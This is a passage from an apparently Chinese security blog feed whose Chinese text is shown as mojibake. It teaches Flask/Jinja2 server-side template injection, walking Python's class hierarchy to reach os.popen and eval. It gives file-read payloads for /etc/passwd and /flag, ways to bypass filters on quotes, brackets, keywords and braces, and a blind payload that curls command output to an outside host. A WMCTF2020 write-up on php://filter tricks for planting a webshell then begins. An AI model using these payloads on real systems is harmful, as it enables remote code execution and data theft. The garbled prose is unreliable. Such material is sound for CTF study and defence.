<li><code>__subclasses__()</code></li>
</ul>
<p>è·å–ç±»çš„æ‰€æœ‰å­ç±»ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base1</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>(<span class="params">Base1</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(Base1.__subclasses__())</span><br><span class="line"><span class="comment">#[&lt;class &#x27;__main__.test&#x27;&gt;]</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>__mro__</code></li>
</ul>
<p>è¿”å›è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºã€‚</p>
<ul>
<li><code>__init__</code></li>
</ul>
<p>æ‰€æœ‰è‡ªå¸¦å¸¦ç±»éƒ½åŒ…å«<strong>init</strong>æ–¹æ³•ï¼Œä¾¿äºåˆ©ç”¨ä»–å½“è·³æ¿æ¥è°ƒç”¨<strong>globals</strong>ã€‚</p>
<ul>
<li><code>__globals__</code></li>
</ul>
<p>ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨æ¨¡å—ï¼Œæ–¹æ³•å’Œå…¨å±€å˜é‡ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">var = <span class="number">2333</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(test.__init__.__globals__)</span><br><span class="line"><span class="comment">#&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x000001B297C64668&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;D:\\phpStudy\\PHPTutorial\\WWW\\1.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;os&#x27;: &lt;module &#x27;os&#x27; from &#x27;D:\\Python37\\lib\\os.py&#x27;&gt;, &#x27;var&#x27;: 2333, &#x27;fun&#x27;: &lt;function fun at 0x000001B297C1C1E0&gt;, &#x27;test&#x27;: &lt;class &#x27;__main__.test&#x27;&gt;&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="æ„é€ é“¾æ€è·¯"><a href="#æ„é€ é“¾æ€è·¯" class="headerlink" title="æ„é€ é“¾æ€è·¯"></a><strong>æ„é€ é“¾æ€è·¯</strong></h1><p>æ€è·¯å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&quot;&quot;</span>.__class__)</span><br><span class="line"><span class="comment">#&lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p>å…ˆä½¿ç”¨è¯¥payloadæ¥è·å–æŸä¸ªç±»ï¼Œè¿™é‡Œå¯ä»¥è·å–åˆ°çš„æ˜¯strç±»ï¼Œå®é™…ä¸Šè·å–åˆ°ä»»ä½•ç±»éƒ½å¯ä»¥ï¼Œå› ä¸ºæˆ‘ä»¬éƒ½æœ€ç»ˆç›®çš„æ˜¯è¦è·å–åˆ°åŸºç±»Objectã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥é€šè¿‡<strong>bases</strong>æˆ–è€…<strong>mro</strong>æ¥è·å–åˆ°objectåŸºç±»ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>])</span><br><span class="line"><span class="comment">#&lt;class &#x27;object&#x27;&gt;</span></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>])</span><br><span class="line"><span class="comment">#&lt;class &#x27;object&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥è·å–å…¶æ‰€æœ‰å­ç±»ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__())</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__())</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__())</span><br><span class="line"><span class="comment">#[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, ... ,&lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;]</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åªéœ€è¦å¯»æ‰¾å¯èƒ½æ‰§è¡Œå‘½ä»¤æˆ–è€…å¯ä»¥è¯»å–æ–‡ä»¶çš„ç±»å°±å¯ä»¥äº†ï¼Œé‡ç‚¹å…³æ³¨os/fileè¿™äº›å…³é”®å­—ã€‚</p>
<h2 id="fileå¯¹è±¡ä»»æ„è¯»å–æ–‡ä»¶"><a href="#fileå¯¹è±¡ä»»æ„è¯»å–æ–‡ä»¶" class="headerlink" title="fileå¯¹è±¡ä»»æ„è¯»å–æ–‡ä»¶"></a><strong>fileå¯¹è±¡ä»»æ„è¯»å–æ–‡ä»¶</strong></h2><ul>
<li>python3ä¸­å·²ç»ç§»é™¤äº†fileï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•åªèƒ½åœ¨python2ä¸­ä½¿ç”¨</li>
</ul>
<p>fileæ˜¯åœ¨å­ç±»åˆ—è¡¨çš„ç¬¬41ä¸ª</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(().__class__.__base__.__subclasses__()[<span class="number">40</span>])</span><br><span class="line"><span class="comment">#&lt;type &#x27;file&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨diræŸ¥çœ‹fileå¯¹è±¡ä¸­çš„å†…ç½®æ–¹æ³•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(dir(().__class__.__base__.__subclasses__()[<span class="number">40</span>]))</span><br><span class="line"><span class="comment">#[&#x27;__class__&#x27;, &#x27;__delattr__&#x27;, &#x27;__doc__&#x27;, &#x27;__enter__&#x27;, &#x27;__exit__&#x27;, &#x27;__format__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__iter__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;close&#x27;, &#x27;closed&#x27;, &#x27;encoding&#x27;, &#x27;errors&#x27;, &#x27;fileno&#x27;, &#x27;flush&#x27;, &#x27;isatty&#x27;, &#x27;mode&#x27;, &#x27;name&#x27;, &#x27;newlines&#x27;, &#x27;next&#x27;, &#x27;read&#x27;, &#x27;readinto&#x27;, &#x27;readline&#x27;, &#x27;readlines&#x27;, &#x27;seek&#x27;, &#x27;softspace&#x27;, &#x27;tell&#x27;, &#x27;truncate&#x27;, &#x27;write&#x27;, &#x27;writelines&#x27;, &#x27;xreadlines&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è°ƒç”¨é‡Œé¢çš„æ–¹æ³•è¿›è¡Œè¯»å–æ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).readlines())</span><br></pre></td></tr></table></figure>

<h2 id="å†…ç½®æ¨¡å—æ‰§è¡Œä»»æ„å‘½ä»¤"><a href="#å†…ç½®æ¨¡å—æ‰§è¡Œä»»æ„å‘½ä»¤" class="headerlink" title="å†…ç½®æ¨¡å—æ‰§è¡Œä»»æ„å‘½ä»¤"></a><strong>å†…ç½®æ¨¡å—æ‰§è¡Œä»»æ„å‘½ä»¤</strong></h2><blockquote>


- è¯¥æ–¹æ³•ä¹Ÿåªèƒ½åœ¨python2ä¸­ä½¿ç”¨

æˆ‘ä»¬çŸ¥é“`__globals__`èƒ½å¤Ÿè¿”å›å½“å‰å¼•ç”¨çš„æ‰€æœ‰æ¨¡å—å’Œå˜é‡ï¼Œå¦‚æœæŸä¸ªç±»å¼•ç”¨äº†OSæ¨¡å—é‚£å°±å¯èƒ½èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ã€‚

è¿™é‡Œæœ‰ä¸€ä¸ªè„šæœ¬ï¼Œå…ˆéå†æ‰€æœ‰å­ç±»ï¼Œç„¶åéå†å­ç±»çš„æ–¹æ³•çš„æ‰€å¼•ç”¨çš„ä¸œè¥¿çš„keyä¹Ÿå°±æ˜¯é”®åï¼Œæ¥æœç´¢æ˜¯å¦è°ƒç”¨äº†osã€‚

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">&#x27;os&#x27;</span>   <span class="comment">#ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ä½ æƒ³åˆ©ç”¨çš„æ¨¡å—</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(&lt;class &#x27;site._Printer&#x27;&gt;, 69)</span></span><br><span class="line"><span class="string">(&lt;class &#x27;site.Quitter&#x27;&gt;, 74)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

ç„¶åç›´æ¥ä½¿ç”¨

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">69</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;dir&#x27;</span>))</span><br><span class="line">print(().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">74</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;dir&#x27;</span>))</span><br></pre></td></tr></table></figure>

å¦‚æœæ˜¯ä¸Šé¢flaskçš„ä¾‹å­

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

ç›´æ¥å»çˆ†ç ´375è¿™ä¸ªæ•°ä¹Ÿå¯ä»¥ã€‚

> 
</blockquote>
<h2 id="builtins-ä»£ç æ‰§è¡Œ"><a href="#builtins-ä»£ç æ‰§è¡Œ" class="headerlink" title="__builtins__ä»£ç æ‰§è¡Œ"></a><strong><code>__builtins__</code>ä»£ç æ‰§è¡Œ</strong></h2>

è¿™ç§çš„è¯ï¼Œpython2ï¼Œ3éƒ½å¯ä»¥ä½¿ç”¨ã€‚

æ€è·¯å¦‚ä¸‹ï¼š

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(dir(__builtins__))</span><br></pre></td></tr></table></figure>

åŒæ ·æŸ¥æ‰¾globalsä¸­å«æœ‰çš„`__builtins__`

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">search = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

payload

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">65</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;/flag&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

> 

<h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a><strong>Bypass</strong></h1><blockquote>


å½“æˆ‘ä»¬éœ€è¦æµ‹è¯•SSTIè¿‡æ»¤äº†ä»€ä¹ˆçš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹payloadé˜²æ­¢å…¶500:

`{{"è¦æµ‹è¯•çš„å­—ç¬¦"}}`ï¼Œåªéœ€è¦çœ‹çœ‹è¦æµ‹è¯•çš„å­—ç¬¦æ˜¯å¦è¿”å›åœ¨é¡µé¢ä¸­å³å¯ï¼Œä¸‹é¢åˆ†åˆ«è¯´è¯´å¯¹åº”å„ç§è¿‡æ»¤æƒ…å†µçš„è§£å†³åŠæ³•ã€‚


</blockquote>
<h2 id="è¿‡æ»¤å¼•å·"><a href="#è¿‡æ»¤å¼•å·" class="headerlink" title="è¿‡æ»¤å¼•å·"></a><strong>è¿‡æ»¤å¼•å·</strong></h2>

å›é¡¾ä¸Šé¢çš„payload

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

å‰é¢çš„å¼•å·æ˜¯ä¸ºäº†å¼•å‡ºåŸºç±»ï¼Œå¯ä»¥è¢«æ›¿æ¢ä¸ºæ•°ç»„ã€å­—å…¸ï¼Œä»¥åŠæ•°å­—ã€‚

åé¢çš„å¼•å·å¯ä»¥ä½¿ç”¨request.argsæ¥ç»•è¿‡æ­¤å¤„çš„è¿‡æ»¤ã€‚

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[request.args.arg1][request.args.arg2](request.args.arg3).read()&#125;&#125;&amp;arg1=os&amp;arg2=popen&amp;arg3=whoami</span><br></pre></td></tr></table></figure>

å¦å¤–çš„ä¸€ç§æ–¹æ³•

é€šè¿‡pythonè‡ªå¸¦å‡½æ•°æ¥ç»•è¿‡å¼•å·ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯chr()ã€‚

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[Â§<span class="number">0</span>Â§].__init__.__globals__.__builtins__.chr&#125;&#125;</span><br></pre></td></tr></table></figure>

é€šè¿‡payloadçˆ†ç ´subclassesï¼Œè·å–æŸä¸ªsubclassesä¸­å«æœ‰chrçš„ç±»ç´¢å¼•ï¼Œå¯ä»¥çœ‹åˆ°çˆ†ç ´å‡ºæ¥å¾ˆå¤šäº†ï¼Œè¿™é‡Œéšä¾¿é€‰ä¸€ä¸ªã€‚

æ¥ç€å°è¯•ä½¿ç”¨chrå°è¯•ç»•è¿‡åç»­æ‰€æœ‰çš„å¼•å·ï¼š

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%set+chr=[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">77</span>].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[chr(<span class="number">111</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)][chr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">111</span>)%<span class="number">2</span>bchr(<span class="number">112</span>)%<span class="number">2</span>bchr(<span class="number">101</span>)%<span class="number">2</span>bchr(<span class="number">110</span>)](chr(<span class="number">100</span>)%<span class="number">2</span>bchr(<span class="number">105</span>)%<span class="number">2</span>bchr(<span class="number">114</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

## **è¿‡æ»¤ä¸­æ‹¬å·**

å›é¡¾æœ€åˆçš„payload

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">375</span>].__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

è¿™é‡Œglobalsçš„ä¸­æ‹¬å·æœ‰ç‚¹é—®é¢˜ã€‚

a[0]ä¸a.**getitem**(0)çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥ä¸Šè¿°payloadå¯ä»¥ç”¨æ­¤æ¥ç»•è¿‡ï¼š

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__.__getitem__(<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">375</span>).__init__.__globals__[<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

## **è¿‡æ»¤å…³é”®å­—**

ä¸»è¦çœ‹å…³é”®å­—æ˜¯å¦‚ä½•è¿‡æ»¤çš„ï¼Œå¦‚æœåªæ˜¯æ›¿æ¢ä¸ºç©ºï¼Œå¯ä»¥å°è¯•åŒå†™ç»•è¿‡ï¼Œå¦‚æœç›´æ¥banäº†ï¼Œå°±å¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²åˆå¹¶çš„æ–¹å¼è¿›è¡Œç»•è¿‡ã€‚

ä½¿ç”¨ä¸­æ‹¬å·çš„payloadï¼š

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>

ä¸ä½¿ç”¨ä¸­æ‹¬å·çš„payloadï¼š

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

è¿™é‡Œä¸»è¦ä½¿ç”¨äº†**getattribute**æ¥è·å–å­—å…¸ä¸­çš„valueï¼Œå‚æ•°ä¸ºkeyå€¼ã€‚

ç¬¬äºŒç§ç»•è¿‡è¿‡æ»¤å…³é”®å­—çš„åŠæ³•ä¹‹å‰ä¹Ÿæåˆ°äº†ï¼Œå³ä½¿ç”¨requestå¯¹è±¡ï¼š

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;&quot;</span>.__getattribute__(request.args.a)&#125;&#125;&amp;a=__class__</span><br></pre></td></tr></table></figure>

ç¬¬ä¸‰ç§ç»•è¿‡å…³é”®å­—è¿‡æ»¤çš„åŠæ³•å³ä½¿ç”¨stråŸç”Ÿå‡½æ•°ï¼š

æˆ‘ä»¬å¯ä»¥ä½¿ç”¨decodeã€replaceç­‰æ¥ç»•è¿‡æ‰€è¿‡æ»¤çš„å…³é”®å­—ã€‚

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;YWE=&quot;</span>.replace(<span class="string">&quot;W&quot;</span>,<span class="string">&quot;&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="comment">#YE=</span></span><br><span class="line">&#123;&#123;<span class="string">&quot;YWE=&quot;</span>.decode(<span class="string">&quot;base64&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="comment">#aa</span></span><br></pre></td></tr></table></figure>

## **æ¨¡å—é˜‰å‰²**

åœ¨æ¯”èµ›ç¯å¢ƒä¸­ï¼Œç»å¸¸ä¼šé˜‰å‰²æ‰ä¸€äº›å†…ç½®å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨reloadæ¥é‡è½½ã€‚

åœ¨Python2ä¸­ï¼Œreloadæ˜¯å†…ç½®å‡½æ•°ï¼Œè€Œåœ¨Python3ä¸­ï¼Œreloadåˆ™ä¸ºimp moduleä¸‹çš„å‡½æ•°ï¼Œä½¿ç”¨æ–¹æ³•ï¼š

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> imp <span class="keyword">import</span> reload</span><br><span class="line">reload(a).popen(<span class="string">&quot;whoami&quot;</span>).read()</span><br></pre></td></tr></table></figure>

æˆ‘ä»¬ä¸€èˆ¬æ˜¯ä¸èƒ½ç›´æ¥reload(os)çš„ï¼Œå› ä¸ºå¯èƒ½å½“å‰ç±»å¹¶æ²¡æœ‰import osã€‚

æ‰€ä»¥ä¸€èˆ¬éƒ½æ˜¯`reload(__builtins__)`ï¼Œè¿™æ—¶å¯ä»¥é‡æ–°è½½å…¥**builtins**ï¼Œæ­¤æ—¶**builtins**ä¸­è¢«åˆ é™¤çš„æ¯”å¦‚evalã€**import**ç­‰å°±åˆéƒ½å›æ¥äº†ã€‚

## **è¿‡æ»¤{{}}**

ç›¸å½“äºæŠŠå‘½ä»¤æ‰§è¡Œçš„ç»“æœå¤–å¸¦å‡ºå»ã€‚

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;curl http://xx.xxx.xx.xx:8080/?i=`whoami`&#x27;</span>).read()==<span class="string">&#x27;p&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

## **è¿‡æ»¤ç‚¹å·**

åœ¨Pythonç¯å¢ƒä¸­(Python2/Python3)ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è®¿é—®å­—å…¸çš„æ–¹å¼æ¥è®¿é—®å‡½æ•°/ç±»ç­‰ã€‚

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__ç­‰ä»·äº<span class="string">&quot;&quot;</span>[<span class="string">&quot;__class__&quot;</span>]</span><br></pre></td></tr></table></figure>

> ]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
  </entry>
  <entry>
    <title>WMCTF2020</title>
    <url>/2020/08/06/WMCTF2020/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h1><p>ä¸ä¼šåšï¼Œå¥½å¤šçŸ¥è¯†ç›²ç‚¹ğŸ™ƒ</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a><strong>web</strong></h1><h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a><strong>web_checkin</strong></h2><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$sandbox = <span class="string">&#x27;/var/www/html/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,$content))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists($content))</span><br><span class="line">        <span class="keyword">require_once</span>($content);</span><br><span class="line">    file_put_contents($content,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥å…ˆå­¦ä¹ Pç¥çš„æ­»äº¡exitçš„ç»•è¿‡ï¼š<a class="foo" target="_blank" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨</a></p>
<p>è¿™é‡Œçš„è¯çœ‹åˆ°<code>file_put_contents()</code>ä¸€èˆ¬å°±æ˜¯å†™shelläº†ï¼Œä½†æ˜¯å› ä¸ºå‰é¢æœ‰<code>exit()</code>å¯¼è‡´å³ä½¿æˆ‘ä»¬æˆåŠŸå†™å…¥ä¸€å¥è¯ï¼Œä¹Ÿæ‰§è¡Œä¸äº†ï¼Œä¸€èˆ¬æ¥è¯´å¯ä»¥ç”¨base64å¯ä»¥ç›´æ¥ç»•è¿‡ï¼Œå¦‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>å…ˆ<code>strip_tags</code>å»é™¤æ­»äº¡<code>exit</code>ï¼Œå†å°†<code>webshell</code>ç”¨<code>base64-decode</code>è¿˜åŸ</p>
<p>åˆæˆ–è€…</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.rot13/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>åŸç†å’Œä¸Šé¢ç±»ä¼¼ï¼Œæ ¸å¿ƒæ˜¯å°†â€æ­»äº¡exitâ€å»é™¤ã€‚<code>&lt;?php exit; ?&gt;</code>åœ¨ç»è¿‡rot13ç¼–ç åä¼šå˜æˆ<code>&lt;?cuc rkvg; ?&gt;</code>ï¼Œ</p>
<p>å¦‚æœæˆ‘ä»¬ä¸Šä¼ <code>&lt;?cuc cucvasb();?&gt;</code>ï¼Œç»è¿‡rot13ç¼–ç åä¼šå˜æˆ<code>&lt;?php phpinfo();?&gt;</code>ã€‚</p>
<p>è¿™å°±æ˜¯Pç¥çš„ä¸‰ç§ç»•è¿‡exitçš„æ–¹æ³•ï¼Œä½†æ˜¯é¢˜ç›®è¿‡æ»¤äº†<code>rot</code>ï¼Œ<code>base64</code>ï¼Œä»¥åŠ<code>file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);</code>ï¼Œå‰åä¸¤ä¸ªåœ°æ–¹éƒ½æ˜¯contentï¼Œæ‰€ä»¥è¿™é¢˜çš„è§£æ³•è¦æ”¹ä¸€ä¸‹ã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´å¾€æ–‡ä»¶é‡Œé¢å†™ä¸œè¥¿å¹¶ç»•è¿‡exitæ˜¯è¿™æ ·çš„</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?content=php://filter/write=string.strip_tags/some_thing/resource=1.php</span><br></pre></td></tr></table></figure>

<p>æ¯”å¦‚è¯´å†™ä¸€ä¸ª<code>.htaccess</code>(è¿™é‡Œå‚è€ƒhhhmå¸ˆå‚…åšå®¢)</p>
